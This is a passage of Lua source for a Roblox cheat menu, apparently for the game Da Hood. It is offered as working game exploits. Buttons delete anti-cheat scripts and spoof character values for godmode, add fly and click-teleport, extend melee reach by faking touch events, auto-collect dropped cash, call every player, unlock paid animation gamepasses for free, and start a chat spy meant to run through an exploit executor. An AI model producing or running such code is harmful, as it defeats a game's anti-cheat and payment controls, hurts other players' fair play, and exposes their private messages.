         if tostring(args[1]) == "DropMoney" or tostring(args[1]) == "TimerDecrease" or  tostring(args[1]) == "Grabbing" or tostring(args[1]) == "Block" or tostring(args[1]) == "Stomp" or tostring(args[1]) == "JoinCrew" or tostring(args[1]) == "PhoneCall" or tostring(args[1]) == "Boombox" or tostring(args[1]) == "BoomboxStop" or tostring(args[1]) == "EnterPromoCode" or tostring(args[1]) == "PurchaseSkinCrate" or tostring(args[1]) == "TimerMoney" or tostring(args[1]) == "Reload" or tostring(args[1]) == "UpdateMousePos" or tostring(args[1]) == "FireworkText" or tostring(args[1]) == "GunCombatToggle" or tostring(args[1]) == "LeaveCrew" or tostring(args[1]) == "AnimationPack" or tostring(args[1]) == "EquipWeaponSkins" or tostring(args[1]) == "REPORT_PLAYER" or tostring(args[1]) == "IS_MOBILE" or tostring(args[1]) == "GamePurchase" then
             else 
                 return
             end 
         end
     return old(self, ...)
 end)
 
 
 function AnimPlay(ID, SPEED)
     local animation = Instance.new('Animation', game:GetService("Workspace"))
     animation.AnimationId = 'rbxassetid://'..ID
     playing = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
     playing:Play() 
     if tonumber(SPEED) then
         playing:AdjustSpeed(SPEED)
     else
         playing:AdjustSpeed(1)
     end
     animation:Destroy()
 end
 
 function AnimStop(ID, SPEED)
     for i,v in pairs(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
         if v.Animation.AnimationId == 'rbxassetid://'..ID then
           if tonumber(SPEED) then
                 v:Stop(SPEED)
             else
                 v:Stop()
             end
         end
     end
 end
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.Godblock then
         Godblock = true
         game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects"):WaitForChild("Defense"):WaitForChild("CurrentTimeBlock"):Destroy()
     end
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.GodV3 then
     game:GetService("StarterPlayer").StarterCharacterScripts["CheckingKOED                                                                   ."]:Destroy()
         for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
             if v.ClassName == 'Script' then
                 v:Destroy()
             end
         end
     end  
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.GodV2 then
         GodV2 = true
         if game:GetService("Players").LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") then
             game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health = 0
         end
         local newCharacter =  game:GetService("Workspace"):WaitForChild(game:GetService("Players").LocalPlayer.Name)
         local spoofFolder = Instance.new('Folder');
         spoofFolder.Name = 'FULLY_LOADED_CHAR';
         spoofFolder.Parent = newCharacter;
         newCharacter:WaitForChild('RagdollConstraints'):Destroy();
         local spoofValue = Instance.new('BoolValue', newCharacter);
         spoofValue.Name = 'RagdollConstraints';         
         game:GetService("Players").LocalPlayer.Character.BodyEffects.Defense:Destroy()
         Defense = Instance.new("IntValue", game:GetService("Players").LocalPlayer.Character.BodyEffects)
         Defense.Name = "Defense"
         Defense.Value = 101
         game:GetService("Players").LocalPlayer.Character:WaitForChild('BodyEffects').Armor:Destroy()
         local Clone1 = Instance.new("IntValue")
         Clone1.Name = "Armor"
         Clone1.Value = 101
         Clone1.Parent = game:GetService("Players").LocalPlayer.Character.BodyEffects
     end
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.Autoblock then
         game:GetService('UserInputService').InputBegan:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.F and not b then
                 HoldingF = true
             end
         end)
         game:GetService('UserInputService').InputEnded:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.F and not b then
                 HoldingF = false
             end
         end)
         game:GetService("RunService").RenderStepped:connect(function()
             local forbidden = {'[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
             local Found = false
             for _,v in pairs(game:GetService("Players"):GetPlayers()) do
                 if v and v.Character and v.Character:FindFirstChild("UpperTorso") and v.Character:FindFirstChild("FULLY_LOADED_CHAR") and (v.Character.UpperTorso.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude <= 25 then
                     if v.Character.BodyEffects.Attacking.Value == true and not table.find(forbidden, v.Character:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= game:GetService("Players").LocalPlayer.Name then
                         Found = true
                         game:GetService("ReplicatedStorage").MainEvent:FireServer('Block', game:GetService("Players").LocalPlayer.Name)
                     end
                 end
             end
             if Found == false and HoldingF == false then
                 if game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects"):FindFirstChild('Block') then 
                     game:GetService("Players").LocalPlayer.Character.BodyEffects.Block:Destroy()
                 end
             end
         end)
     end
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.Hideblock then
         game:GetService("RunService").RenderStepped:connect(function()
             pcall(function()
                 for i,v in pairs(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
                     if v.Animation.AnimationId == 'rbxassetid://5641749824' or v.Name == 'Block' then
                         v:Stop() 
                     end
                 end
             end)
         end)
     end
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.Antislow then
         repeat wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField_TESTING")
         wait(1)
         game:GetService('UserInputService').InputBegan:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.LeftShift and not b then
                 repeat wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField_TESTING")
                 game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Name = "Humanoid "
                 game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 22
             end
         end)
         game:GetService('UserInputService').InputEnded:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.LeftShift and not b then
                 repeat wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField_TESTING")
                 game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 16
             end
         end)
         game:GetService('UserInputService').InputBegan:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.LeftControl and not b then
                 repeat wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField_TESTING")
                 AnimPlay(3152394906)
             end
         end)
         game:GetService('UserInputService').InputEnded:Connect(function(key,b)
             if key.KeyCode == Enum.KeyCode.LeftControl and not b then
                 repeat wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField_TESTING")
                 AnimStop(3152394906)
             end
         end)
     end
 end)()
 
 coroutine.wrap(function()
     if getgenv().Settings.Custom.Antieffect then
         game:GetService("RunService").RenderStepped:connect(function()
             pcall(function()
                 local Particle = game:GetService("Players").LocalPlayer.Character.UpperTorso:FindFirstChild('ElectricuteParticle') or game:GetService("Players").LocalPlayer.Character.UpperTorso:FindFirstChild('FlamethrowerFireParticle') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('Christmas_Sock')
                 if Particle then 
                     Particle:Destroy() 
                 end
             end)
         end)   
     end
 end)
 
 game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(chr) 
     if GodV2 == true then
         local newCharacter =  game:GetService("Workspace"):WaitForChild(game:GetService("Players").LocalPlayer.Name)
         local spoofFolder = Instance.new('Folder');
         spoofFolder.Name = 'FULLY_LOADED_CHAR';
         spoofFolder.Parent = newCharacter;
         newCharacter:WaitForChild('RagdollConstraints'):Destroy();
         local spoofValue = Instance.new('BoolValue', newCharacter);
         spoofValue.Name = 'RagdollConstraints';         
         game:GetService("Players").LocalPlayer.Character.BodyEffects.Defense:Destroy()
         Defense = Instance.new("IntValue", game:GetService("Players").LocalPlayer.Character.BodyEffects)
         Defense.Name = "Defense"
         Defense.Value = 101
         game:GetService("Players").LocalPlayer.Character:WaitForChild('BodyEffects').Armor:Destroy()
         local Clone1 = Instance.new("IntValue")
         Clone1.Name = "Armor"
         Clone1.Value = 101
         Clone1.Parent = game:GetService("Players").LocalPlayer.Character.BodyEffects
         if Godblock == true then
             game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects"):WaitForChild("Defense"):WaitForChild("CurrentTimeBlock"):Destroy()
         end
     end
 end)
 end)
 
 dhscriptsSection:NewButton("Q To Tp", "Works Fine", function()
 key = "Q"
 
 
 local plr = game.Players.LocalPlayer
 local chr = plr.Character or plr.CharacterAdded:Wait()
 local uis = game:GetService("UserInputService")
 
 uis.InputBegan:Connect(function(keyc, sp)
 if keyc.KeyCode == Enum.KeyCode[key] and not sp and plr:GetMouse().Target then
   chr:WaitForChild("HumanoidRootPart").CFrame = plr:GetMouse().Hit
 end
 end)
 end)
 
 dhscriptsSection:NewButton("Call All", "Works", function()
 local StarterGui = game:GetService("StarterGui")
 for i,v in pairs(game.Players:GetChildren()) do
     if v.Name ~= game.Players.LocalPlayer.Name then
         game.Players.LocalPlayer.Backpack["[Phone]"].Parent = game.Players.LocalPlayer.Character
         game.ReplicatedStorage.MainEvent:FireServer("PhoneCall", tostring(v.Name))
         task.wait()
         game.Players.LocalPlayer.Character["[Phone]"].Parent = game.Players.LocalPlayer.Backpack
         task.wait()
         local success, result = pcall(StarterGui.SetCoreGuiEnabled, StarterGui, Enum.CoreGuiType.Backpack, true)
         task.wait(.2)
     end
 end
 end)
 
 dhscriptsSection:NewButton("Q Free Fist", "Works I think", function()
 -- // Variables
 local localPlayer       = game:GetService("Players").LocalPlayer
 local localCharacter    = localPlayer.Character
 local Mouse             = localPlayer:GetMouse()
 local FistControl       = false
 local LeftFist          = localCharacter.LeftHand
 local RightFist         = localCharacter.RightHand
 
 -- // Services
 local uis = game:GetService("UserInputService")
 
 -- // Coroutine Loop + Functions
 local loopFunction = function()
     LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
     RightFist.CFrame = CFrame.new(Mouse.Hit.p)
 end
 
 local Loop
 
 local Start = function()
     Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
 end
 
 local Pause = function()
     Loop:Disconnect()
 end
 
 -- // Hotkeys
 uis.InputBegan:connect(function(Key)
     if (Key.KeyCode == Enum.KeyCode.Q) then
         if (FistControl == false) then
             FistControl = true
             Start()
             pcall(function()
                 localCharacter.RightHand.RightWrist:Remove()
                 localCharacter.LeftHand.LeftWrist:Remove()
             end)
         elseif (FistControl == true) then
             FistControl = false
             Pause()
             local rightwrist  = Instance.new("Motor6D")
             rightwrist.Name   = "RightWrist"
             rightwrist.Parent = localCharacter.RightHand
             rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
             rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
             rightwrist.Part0  = localCharacter.RightLowerArm
             rightwrist.Part1  = localCharacter.RightHand
 
             local leftwrist   = Instance.new("Motor6D")
             leftwrist.Name    = "LeftWrist"
             leftwrist.Parent  = localCharacter.LeftHand
             leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
             leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
             leftwrist.Part0   = localCharacter.LeftLowerArm
             leftwrist.Part1   = localCharacter.LeftHand
         end
     end
 end)
 end)
 
 dhscriptsSection:NewButton("Animation Gamepasses", "Both", function()
     repeat
         wait()
     until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lean") then
         game.ReplicatedStorage.ClientAnimations.Lean:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lay") then
         game.ReplicatedStorage.ClientAnimations.Lay:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance1") then
         game.ReplicatedStorage.ClientAnimations.Dance1:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance2") then
         game.ReplicatedStorage.ClientAnimations.Dance2:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Greet") then
         game.ReplicatedStorage.ClientAnimations.Greet:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Chest Pump") then
         game.ReplicatedStorage.ClientAnimations["Chest Pump"]:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Praying") then
         game.ReplicatedStorage.ClientAnimations.Praying:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TheDefault") then
         game.ReplicatedStorage.ClientAnimations.TheDefault:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Sturdy") then
         game.ReplicatedStorage.ClientAnimations.Sturdy:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Rossy") then
         game.ReplicatedStorage.ClientAnimations.Rossy:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Griddy") then
         game.ReplicatedStorage.ClientAnimations.Griddy:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TPose") then
         game.ReplicatedStorage.ClientAnimations.TPose:Destroy()
     end
     
     if game.ReplicatedStorage.ClientAnimations:FindFirstChild("SpeedBlitz") then
         game.ReplicatedStorage.ClientAnimations.SpeedBlitz:Destroy()
     end
     
     local Animations = game.ReplicatedStorage.ClientAnimations
     
     local LeanAnimation = Instance.new("Animation", Animations)
     LeanAnimation.Name = "Lean"
     LeanAnimation.AnimationId = "rbxassetid://3152375249"
     
     local LayAnimation = Instance.new("Animation", Animations)
     LayAnimation.Name = "Lay"
     LayAnimation.AnimationId = "rbxassetid://3152378852"
     
     local Dance1Animation = Instance.new("Animation", Animations)
     Dance1Animation.Name = "Dance1"
     Dance1Animation.AnimationId = "rbxassetid://3189773368"
     
     local Dance2Animation = Instance.new("Animation", Animations)
     Dance2Animation.Name = "Dance2"
     Dance2Animation.AnimationId = "rbxassetid://3189776546"
     
     local GreetAnimation = Instance.new("Animation", Animations)
     GreetAnimation.Name = "Greet"
     GreetAnimation.AnimationId = "rbxassetid://3189777795"
     
     local ChestPumpAnimation = Instance.new("Animation", Animations)
     ChestPumpAnimation.Name = "Chest Pump"
     ChestPumpAnimation.AnimationId = "rbxassetid://3189779152"
     
     local PrayingAnimation = Instance.new("Animation", Animations)
     PrayingAnimation.Name = "Praying"
     PrayingAnimation.AnimationId = "rbxassetid://3487719500"
     
     local TheDefaultAnimation = Instance.new("Animation", Animations)
     TheDefaultAnimation.Name = "TheDefault"
     TheDefaultAnimation.AnimationId = "rbxassetid://11710529975" -- FIX THIS
     
     local SturdyAnimation = Instance.new("Animation", Animations)
     SturdyAnimation.Name = "Sturdy"
     SturdyAnimation.AnimationId = "rbxassetid://11710524717"
     
     local RossyAnimation = Instance.new("Animation", Animations)
     RossyAnimation.Name = "Rossy"
     RossyAnimation.AnimationId = "rbxassetid://11710527244"
     
     local GriddyAnimation = Instance.new("Animation", Animations)
     GriddyAnimation.Name = "Griddy"
     GriddyAnimation.AnimationId = "rbxassetid://11710529220"
     
     local TPoseAnimation = Instance.new("Animation", Animations)
     TPoseAnimation.Name = "TPose"
     TPoseAnimation.AnimationId = "rbxassetid://11710524200"
     
     local SpeedBlitzAnimation = Instance.new("Animation", Animations)
     SpeedBlitzAnimation.Name = "SpeedBlitz"
     SpeedBlitzAnimation.AnimationId = "rbxassetid://11710541744"
     
     function AnimationPack(Character)
         Character:WaitForChild'Humanoid'
         repeat
             wait()
         until game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")
     
         local AnimationPack = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
         local AnimationPackPlus = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPlusPack
         local ScrollingFrame = AnimationPack.ScrollingFrame
         local CloseButton = AnimationPack.CloseButton
         local ScrollingFramePlus = AnimationPackPlus.ScrollingFrame
         local CloseButtonPlus = AnimationPackPlus.CloseButton
     
         local Lean = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LeanAnimation)
     
         local Lay = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LayAnimation)
     
         local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)
     
         local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)
     
         local Greet = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GreetAnimation)
     
         local ChestPump = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ChestPumpAnimation)
     
         local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
     
         local TheDefault = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TheDefaultAnimation)
     
         local Sturdy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SturdyAnimation)
     
         local Rossy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(RossyAnimation)
     
         local Griddy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GriddyAnimation)
     
         local TPose = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TPoseAnimation)
     
         local SpeedBlitz = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SpeedBlitzAnimation)
     
         AnimationPack.Visible = true
     
         AnimationPackPlus.Visible = true
     
         ScrollingFrame.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
     
         ScrollingFramePlus.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Lean" then
                     v.Name = "LeanButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Lay" then
                     v.Name = "LayButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Dance1" then
                     v.Name = "Dance1Button"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Dance2" then
                     v.Name = "Dance2Button"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Greet" then
                     v.Name = "GreetButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Chest Pump" then
                     v.Name = "ChestPumpButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFrame:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Praying" then
                     v.Name = "PrayingButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "The Default" then
                     v.Name = "TheDefaultButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Sturdy" then
                     v.Name = "SturdyButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Rossy" then
                     v.Name = "RossyButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Griddy" then
                     v.Name = "GriddyButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "T Pose" then
                     v.Name = "TPoseButton"
                 end
             end
         end
     
         for i,v in pairs(ScrollingFramePlus:GetChildren()) do
             if v.Name == "TextButton" then
                 if v.Text == "Speed Blitz" then
                     v.Name = "SpeedBlitzButton"
                 end
             end
         end
     
         function Stop()
             Lean:Stop()
             Lay:Stop()
             Dance1:Stop()
             Dance2:Stop()
             Greet:Stop()
             ChestPump:Stop()
             Praying:Stop()
             TheDefault:Stop()
             Sturdy:Stop()
             Rossy:Stop()
             Griddy:Stop()
             TPose:Stop()
             SpeedBlitz:Stop()
         end
     
     
     
         local LeanTextButton = ScrollingFrame.LeanButton
         local LayTextButton = ScrollingFrame.LayButton
         local Dance1TextButton = ScrollingFrame.Dance1Button
         local Dance2TextButton = ScrollingFrame.Dance2Button
         local GreetTextButton = ScrollingFrame.GreetButton
         local ChestPumpTextButton = ScrollingFrame.ChestPumpButton
         local PrayingTextButton = ScrollingFrame.PrayingButton
         local TheDefaultTextButton = ScrollingFramePlus.TheDefaultButton
         local SturdyTextButton = ScrollingFramePlus.SturdyButton
         local RossyTextButton = ScrollingFramePlus.RossyButton
         local GriddyTextButton = ScrollingFramePlus.GriddyButton
         local TPoseTextButton = ScrollingFramePlus.TPoseButton
         local SpeedBlitzTextButton = ScrollingFramePlus.SpeedBlitzButton
     
         AnimationPack.MouseButton1Click:Connect(function()
             if ScrollingFrame.Visible == false then
                 ScrollingFrame.Visible = true
                 CloseButton.Visible = true
                 AnimationPackPlus.Visible = false
             end
         end)
         AnimationPackPlus.MouseButton1Click:Connect(function()
             if ScrollingFramePlus.Visible == false then
                 ScrollingFramePlus.Visible = true
                 CloseButtonPlus.Visible = true
                 AnimationPack.Visible = false
             end
         end)
         CloseButton.MouseButton1Click:Connect(function()
             if ScrollingFrame.Visible == true then
                 ScrollingFrame.Visible = false
                 CloseButton.Visible = false
                 AnimationPackPlus.Visible = true
             end
         end)
         CloseButtonPlus.MouseButton1Click:Connect(function()
             if ScrollingFramePlus.Visible == true then
                 ScrollingFramePlus.Visible = false
                 CloseButtonPlus.Visible = false
                 AnimationPack.Visible = true
             end
         end)
     
         LeanTextButton.MouseButton1Click:Connect(function()
             Stop()
             Lean:Play()
         end)
         LayTextButton.MouseButton1Click:Connect(function()
             Stop()
             Lay:Play()
         end)
         Dance1TextButton.MouseButton1Click:Connect(function()
             Stop()
             Dance1:Play()
         end)
         Dance2TextButton.MouseButton1Click:Connect(function()
             Stop()
             Dance2:Play()
         end)
         GreetTextButton.MouseButton1Click:Connect(function()
             Stop()
             Greet:Play()
         end)
         ChestPumpTextButton.MouseButton1Click:Connect(function()
             Stop()
             ChestPump:Play()
         end)
         PrayingTextButton.MouseButton1Click:Connect(function()
             Stop()
             Praying:Play()
         end)
         TheDefaultTextButton.MouseButton1Click:Connect(function()
             Stop()
             TheDefault:Play()
         end)
         SturdyTextButton.MouseButton1Click:Connect(function()
             Stop()
             Sturdy:Play()
         end)
         RossyTextButton.MouseButton1Click:Connect(function()
             Stop()
             Rossy:Play()
         end)
         GriddyTextButton.MouseButton1Click:Connect(function()
             Stop()
             Griddy:Play()
         end)
         TPoseTextButton.MouseButton1Click:Connect(function()
             Stop()
             TPose:Play()
         end)
         SpeedBlitzTextButton.MouseButton1Click:Connect(function()
             Stop()
             SpeedBlitz:Play()
         end)
     
         game:GetService("Players").LocalPlayer.Character.Humanoid.Running:Connect(function()
             Stop()
         end)
     
         game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
             Stop()
         end)
     end
     AnimationPack(game.Players.LocalPlayer.Character)
     game.Players.LocalPlayer.CharacterAdded:Connect(AnimationPack)
 end)
 
 dhscriptsSection:NewButton("Cash aura", "PLEZ", function()
 while wait() do
 
 
     local function getMoneyAroundMe() 
         for i, money in ipairs(game.Workspace.Ignored.Drop:GetChildren()) do
             if money.Name == "MoneyDrop" and (money.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 5 then
                 fireclickdetector(money.ClickDetector)
             end  
         end
     end
     
      getMoneyAroundMe()
     end    
 end)
 
 dhscriptsSection:NewButton("X Fly", "Script works when fully in game", function()
     local plr = game.Players.LocalPlayer
     local mouse = plr:GetMouse()
     
     localplayer = plr
     
     if workspace:FindFirstChild("Core") then
     workspace.Core:Destroy()
     end
     
     local Core = Instance.new("Part")
     Core.Name = "Core"
     Core.Size = Vector3.new(0.05, 0.05, 0.05)
     
     spawn(function()
     Core.Parent = workspace
     local Weld = Instance.new("Weld", Core)
     Weld.Part0 = Core
     Weld.Part1 = localplayer.Character.LowerTorso
     Weld.C0 = CFrame.new(0, 0, 0)
     end)
     
     workspace:WaitForChild("Core")
     
     local torso = workspace.Core
     flying = true
     local speed=10
     local keys={a=false,d=false,w=false,s=false}
     local e1
     local e2
     local function start()
     local pos = Instance.new("BodyPosition",torso)
     local gyro = Instance.new("BodyGyro",torso)
     pos.Name="EPIXPOS"
     pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
     pos.position = torso.Position
     gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
     gyro.cframe = torso.CFrame
     repeat
     wait()
     localplayer.Character.Humanoid.PlatformStand=true
     local new=gyro.cframe - gyro.cframe.p + pos.position
     if not keys.w and not keys.s and not keys.a and not keys.d then
     speed=5
     end
     if keys.w then
     new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
     speed=speed+0
     end
     if keys.s then
     new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
     speed=speed+0
     end
     if keys.d then
     new = new * CFrame.new(speed,0,0)
     speed=speed+0
     end
     if keys.a then
     new = new * CFrame.new(-speed,0,0)
     speed=speed+0
     end
     if speed>10 then
     speed=5
     end
     pos.position=new.p
     if keys.w then
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
     elseif keys.s then
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
     else
     gyro.cframe = workspace.CurrentCamera.CoordinateFrame
     end
     until flying == false
     if gyro then gyro:Destroy() end
     if pos then pos:Destroy() end
     flying=false
     localplayer.Character.Humanoid.PlatformStand=false
     speed=10
     end
     e1=mouse.KeyDown:connect(function(key)
     if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
     if key=="w" then
     keys.w=true
     elseif key=="s" then
     keys.s=true
     elseif key=="a" then
     keys.a=true
     elseif key=="d" then
     keys.d=true
     elseif key=="x" then
     if flying==true then
     flying=false
     else
     flying=true
     start()
     end
     end
     end)
     e2=mouse.KeyUp:connect(function(key)
     if key=="w" then
     keys.w=false
     elseif key=="s" then
     keys.s=false
     elseif key=="a" then
     keys.a=false
     elseif key=="d" then
     keys.d=false
     end
     end)
     start()
 end)
 
 
 dhscriptsSection:NewButton("Reach Scriptv2", "Permant on server", function()
     game:GetService('RunService'):BindToRenderStep("Reach", 0 , function(value)
         local success, err = pcall(function()
             if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                 for i,v in pairs(game:GetService('Players'):GetChildren()) do
                     if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                         if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                             if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                 firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                             else
                                 firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                 firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                 firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                 firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                 firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                 firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                             end
                         end
                     end
                 end
             end
             end)
         end)    
 end)
 
 dhscriptsSection:NewButton("Reach Script if doesnt work use↑", "Permant on server", function()
     for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
         if v:isA("Tool") then
             local a = Instance.new("SelectionBox", v.Handle)
             a.Adornee = v.Handle
             v.Handle.Size = Vector3.new(50, 50, 50)
             v.Handle.Transparency = 1
             v.GripPos = Vector3.new(0, 0, 0)
         end
 end
 end)
 
 dhscriptsSection:NewButton("Chat Spy", "Permant on server(rejoin to take off)", function()
 --[[
     Simple Chat Spy
     Type "spy" to enable or disable the chat spy.
     Only tested if this works executed with Synapse (should work with other exploits though)
 --]]
 
 print("-- Chat Spy Executed --")
 print("Type \"spy\" to enable or disable the chat spy.")
 print("Only tested if this works executed with Synapse (should work with other exploits though)")
 print("https://github.com/dehoisted/Chat-Spy")
 
 -- Config
 Config = {
     enabled = true,
     spyOnMyself = true,
     public = false,
